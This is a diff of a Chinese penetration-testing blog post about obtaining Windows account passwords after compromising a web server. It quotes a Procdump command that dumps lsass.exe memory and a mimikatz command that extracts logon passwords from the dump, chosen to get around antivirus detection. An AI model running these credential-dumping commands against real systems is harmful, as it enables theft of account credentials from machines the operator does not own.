@@ -19,7 +19,7 @@
 <meta property="og:description" content="0x01 前言：前段时间拿下一个网站的shell，很幸运的是直接就是System权限，结果发现执行添加用户命令并不能成功回显 看了下系统进程，原来是开启了360的主动防御，奈何也不会做免杀，上传exp运行就被杀，尝试各种方法去kill主动防御进程，无果。。。">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://www.se7ensec.cn/images/og_image.png">
-<meta property="og:updated_time" content="2018-11-10T15:02:56.587Z">
+<meta property="og:updated_time" content="2020-01-19T11:08:36.359Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用Procdump+Mimikatz获取Windows帐户密码">
 <meta name="twitter:description" content="0x01 前言：前段时间拿下一个网站的shell，很幸运的是直接就是System权限，结果发现执行添加用户命令并不能成功回显 看了下系统进程，原来是开启了360的主动防御，奈何也不会做免杀，上传exp运行就被杀，尝试各种方法去kill主动防御进程，无果。。。">
@@ -167,7 +167,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    3 分钟 读完 (大约 461 个字)
+                    3 分钟 读完 (大约 441 个字)
                 </span>
                 
                 
@@ -196,7 +196,7 @@
 <p>这里用到微软官方发布的工具<code>Procdump</code>导出<code>lsass.exe</code>，所以不存在被杀软拦截的情况：</p>
 <p><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
 <p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2018.11.8/3.jpg" alt="3"></p>
-<h2 id="0x03-执行mimikatz"><a href="#0x03-执行mimikatz" class="headerlink" title="0x03 执行mimikatz"></a>0x03 执行mimikatz</h2><p>这里不建议直接上传到服务器上执行，一是有一定概率出现玄学bug导致服务器崩溃，二是可能会被杀软拦截</p>
+<h2 id="0x03-执行mimikatz"><a href="#0x03-执行mimikatz" class="headerlink" title="0x03 执行mimikatz"></a>0x03 执行mimikatz</h2><p>这里不建议直接上传到服务器上执行，因为可能会被杀软拦截</p>
 <p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2018.11.8/4.jpg" alt="4"></p>
 <p>将<code>lsass.dmp</code>下载到本地后，然后执行<code>mimikatz</code>  </p>
 <p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</code></p>
